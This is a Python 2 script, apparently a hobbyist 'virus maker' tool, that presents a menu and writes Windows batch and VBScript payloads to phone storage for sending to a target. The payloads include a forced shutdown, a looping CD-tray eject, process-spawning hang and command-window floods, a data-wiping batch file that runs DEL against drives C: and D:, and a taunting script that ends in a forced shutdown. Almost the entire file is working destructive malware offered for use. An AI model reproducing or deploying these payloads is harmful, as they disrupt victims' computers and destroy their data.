# - *- coding: utf- 8 - *-

blue='\033[94m'
green='\033[92m'
purple='\033[95m'
cyan='\033[96m'
red='\033[91m'
white='\033[97m'
yellow='\033[93m'

import os
import sys
import time
import random

os.system('clear')

print "\033[91m "
print "    _    ___     _____                         //|     __"
print          "    | |  / (_)___/__  /  _________  ____ ___  _|/||_ __/ /"
print          "    | | / / / ___/ / /  / ___/ __ \/ __ `__ \/ __ `// ___/"
print          "    | |/ / / /    / /__/ /__/ /_/ / / / / / / /_/ // /__"
print          "    |___/_/_/    /____/\___/\____/_/ /_/ /_/\__,_/ \  _/v1.0x"

time.sleep(2)
print
print "\033[91m			WARNING!"
print "\033[92m "
print " 		Welcome Virusher!"
print "    this tool does not apply to Android users & iOS."
print "	   Virus file shaped documents,"
print "    you can connect to LHOST or send directly to the target!"
print "	   Use this tool wisely!"
print "\033[91m	   Achisihood is not the author's responsibility!"
print "\033[93m                                      CyXNot404 Developmen"
print
print "\033[95m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
print "\033[91m [W] = Warned Virus\033[96m       [L] = Low Virus"
print "\033[95m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
print
print "\033[94m	   [\033[91m 1\033[94m ]\033[96m SHUTDOWN VIRUS(s)[L]"
print "\033[94m           [\033[91m 2\033[94m ]\033[96m AUTO OPEN DVD[L]"
print "\033[94m           [\033[91m 3\033[94m ]\033[96m HANG VIRUS[L]"
print "\033[94m           [\033[91m 4\033[94m ]\033[96m CMD OPENed[L]"
print "\033[94m           [\033[91m 5\033[94m ]\033[91m AUTO FORMATED DATABASE[W]"
print "\033[94m           [\033[91m 6\033[94m ]\033[91m MALIGNAN VIRUS[W]"
print "\033[94m           [\033[91m 7\033[94m ]\033[92m DOWNLOAD V2.0[C]"
print "\033[93m"
v = raw_input('           [ Chose Optional ]> ')
print
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)

if v == '1':
    print "\033[95m           [LOADING...]"
    time.sleep(2)
    print "------------------------------------------------------"
    mengetik('[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]100%')
    print "------------------------------------------------------"
    time = raw_input('4Ut0 5hUtD0wN T!m3 : ')
    print
    print "Virus Sedang Dibuat!"
    print "------------------------------------------------------"
    os.system('sleep 2')
    print "------------------------------------------------------"
    fo = open('SHUTDOWN.bat','w')
    wk ="""@echo shutdown  -s -t """
    pf = time
    ha =""" -f"""
    fo.write(wk)
    fo.write(pf)
    fo.write(ha)
    fo.close()
    os.system('mv SHUTDOWN.bat /sdcard')
    print "THE VIRUS HAS BEEN CREATED BY NAME \033[97m SHUTDOWN.bat"
    print "\033[96mVIRUS FILE SAVED IN INTERNAL STORAGE!"

if v == '2':
    print "\033[95m           [LOADING...]"
    time.sleep(2)
    print "------------------------------------------------------"
    mengetik('[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]100%')
    print "------------------------------------------------------"
    time = raw_input('4Ut0 0p3n t!M3 : ')
    print
    print "Virus Will be Create!.."
    print "------------------------------------------------------"
    os.system('sleep 2')
    print "------------------------------------------------------"
    fo = open('DVDV.vbs','w')
    wk ='''Set oWMP = CreateObject("WMPlayer.OCX.7")
Set colCDROMs = oWMP.cdromCollection
do
if colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
End If
wscript.sleep '''
    pf = time
    ha ="""\nloop"""
    fo.write(wk)
    fo.write(pf)
    fo.write(ha)
    fo.close()
    os.system('mv DVDV.vbs /sdcard')
    print "THE VIRUS HAS BEEN CREATED BY NAME \033[97m DVDV.vbs"
    print "\033[96mVIRUS FILE SAVED IN INTERNAL STORAGE!"

if v == '3':
    print "\033[95m           [LOADING...]"
    time.sleep(2)
    print "------------------------------------------------------"
    mengetik('[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]100%')
    print "------------------------------------------------------"
    fo = open('HANG.bat','w')
    k ="""@ECHO off
:top START %SystemRoot%/system32/notepad.exe"""
    fo.write(k)
    fo.close()
    os.system('mv HANG.bat /sdcard')
    print "THE VIRUS HAS BEEN CREATED BY NAME \033[97m HANG.bat"
    print "\033[96mVIRUS FILE SAVED IN INTERNAL STORAGE!"

if v == '4':
   print "\033[95m           [LOADING...]"
   time.sleep(2)
   print "------------------------------------------------------"
   mengetik('[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]100%')
   print "------------------------------------------------------"
   fo = open('CMDV.bat','w')
   p ="""@ECHO off
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start                                                                   
start
start
start
start
start                                                                   
start
start
start
start
start
start
"""
   fo.write(p)
   fo.close()
   os.system('mv CMDV.bat /sdcard')
   print "THE VIRUS HAS BEEN CREATED BY NAME \033[97m CMDV.bat"
   print "\033[96mVIRUS FILE SAVED IN INTERNAL STORAGE!"

if v == '5':
   print "\033[95m           [LOADING...]"
   time.sleep(2)
   print "------------------------------------------------------"
   mengetik('[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]100%')       
   print "------------------------------------------------------"   
   tek = raw_input('Write The Short Message : ')
   print
   fo = open('FORMAT.bat','w')
   p ="""@echo off\n"""
   d ="""echo """
   i = tek
   k ="""\nDEL C: -Y
DEL D: -Y"""
   fo.write(p)
   fo.write(d)
   fo.write(i)
   fo.write(k)
   fo.close()
   os.system('mv FORMAT.bat /sdcard')
   os.system('figlet W4RNG | lolcat')
   print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++"         
   print "I Dont Recomended Use This Virus,But if you want..."
   print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++"
   os.system('sleep 2')
   print "THE VIRUS HAS BEEN CREATED BY NAME \033[91m FORMAT.bat"
   print "\033[96mVIRUS FILE SAVED IN INTERNAL STORAGE!"

if v == '6':
   print "\033[95m           [LOADING...]"
   time.sleep(2)
   print "------------------------------------------------------"                                        
   mengetik('[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]100%')                                             
   print "------------------------------------------------------"
   print "\033[92m "
   mes1 = raw_input('Write The Message : ')
   mes2 = raw_input('Tambahan Pesan..? : ')
   kw ="""cls
:A
color 0a
cls
@echo off
echo Wscript.Sleep 5000>C:\sleep5000.vbs
echo Wscript.Sleep 3000>C:\sleep3000.vbs
echo Wscript.Sleep 4000>C:\sleep4000.vbs
echo Wscript.Sleep 2000>C:\sleep2000.vbs
cd %systemroot%\System32
dir
cls
start /w wscript.exe C:\sleep3000.vbs\n"""
   tel ="""echo """
   tek = mes1
   kn ="""\necho:
echo:
echo:
start /w wscript.exe C:\sleep3000.vbs
echo:\n
"""
   tek2 ="""echo """
   tem = mes2
   he ='''\nstart /w wscript.exe C:\sleep2000.vbs
echo …………
start /w wscript.exe C:\sleep4000.vbs
echo …………
echo MAAFKAN SAYA By CyXNot404
start /w wscript.exe C:\sleep2000.vbs
echo:
echo:
echo:
echo VIRUS INI ADALAH VIRUS YANG SANGAT MEMATIKAN…
cd C:\Documents and Settings\All Users\Start Menu\Programs\\
mkdir SIBANGSAT
start /w wscript.exe C:\sleep3000.vbs
echo:
start /w wscript.exe C:\sleep3000.vbs
echo ………..
echo:
start /w wscript.exe C:\sleep3000.vbs
echo:
echo:
start /w wscript.exe C:\sleep2000.vbs
echo Mampus lu kan! Makanya Tobat Jncok!
start /w wscript.exe C:\sleep2000.vbs
start /w wscript.exe C:\sleep2000.vbs
echo W BERSIHIN PC LU BIAR BARU LAGI KEK DLU EAkn :)
start /w wscript.exe C:\sleep2000.vbs
echo:
echo:
echo:
echo VIRUS CRACKING PC? YES DONE !HAHA!
start /w wscript.exe C:\sleep2000.vbs
echo:
echo:
echo:
echo:
start /w wscript.exe C:\sleep2000.vbs
pause
echo AUTO SHUTDOWN DALAM WAKTU 5 SECOND!
shutdown -f -t 5 -s -c "Hadeeeuuh Makanya Tobat Cok Mampus Kan lu! Computer Has Been Hacked!"
'''
   fo = open('WARNING.bat','w')
   fo.write(kw)
   fo.write(tel)
   fo.write(tek)
   fo.write(kn)
   fo.write(tek2)
   fo.write(tem)
   fo.write(he)
   fo.close()
   os.system('mv WARNING.bat /sdcard')
   os.system('figlet W4RNG | lolcat')
   print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++"
   print "I Dont Recomended Use This Virus,But if you want..."
   print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++"
   os.system('sleep 2')
   print "THE VIRUS HAS BEEN CREATED BY NAME \033[91m WARNING.bat"
   print "\033[96mVIRUS FILE SAVED IN INTERNAL STORAGE!"

if v == '7':
   print "\033[96m           [ CHECKING... ]"
   time.sleep(1)
   mengetik('[================================================]')
   print
   print "\033[94mNot Found The Version2,Please Wait Or Contact CyXNot404"
   os.system('toilet "404" -F gay')
   os.system('toilet "Not" -F gay')
   os.system('toilet "Found" -F gay')
